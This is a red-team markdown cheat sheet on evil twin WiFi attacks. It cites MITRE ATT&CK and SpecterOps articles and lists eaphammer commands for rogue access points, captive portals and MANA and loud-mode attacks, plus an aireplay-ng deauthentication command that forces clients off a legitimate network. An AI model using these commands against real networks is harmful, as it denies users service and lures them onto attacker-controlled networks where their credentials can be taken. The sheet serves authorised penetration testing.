<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Evil Twin
## References
* MITRE ATT&CK: Rogue WiFi access points -<br />[https://attack.mitre.org/techniques/T1465/](https://attack.mitre.org/techniques/T1465/) 
## eaphammer

Evil twin tool by s0lst1c3 from SpecterOps
* part one:
    - https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee
* part two
    - https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9
* part three
    - https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38

### Forced roaming (enticement)
We provide a superior signal than the target access point, which entices a client device to roam to our AP

```bash
./eaphammer -i wlan0 --essid EvilCorpWiFi --captive-portal
```
### Forced roaming (coercion)
We block access to the target access point using deauthentication packets, jamming, or some other form of denial-of-service (DoS) attack. This coerces any client devices connected to the AP to roam to our rogue access point.

```bash
# start eaphammer
./eaphammer -i wlan0 --essid EvilCorpWiFi --captive-portal
# deauth client
aireplay-ng -0 0 -a de:ad:be:ef:13:37
```

### MANA Attack
The new KARMA

```bash
./eaphammer -i wlan0 --essid EvilCorpWiFi --cloaking full --captive-portal --mana --mac-whitelist whitelist.txt
```

Loud mode (beacons with all probe requests from all devices).  "By doing this, loud mode attacks allow an adversary to target a relatively secure device by exploiting the bad probing behavior of a second device"

```bash
./eaphammer -i wlan0 --essid EvilCorpWiFi --mana --loud
```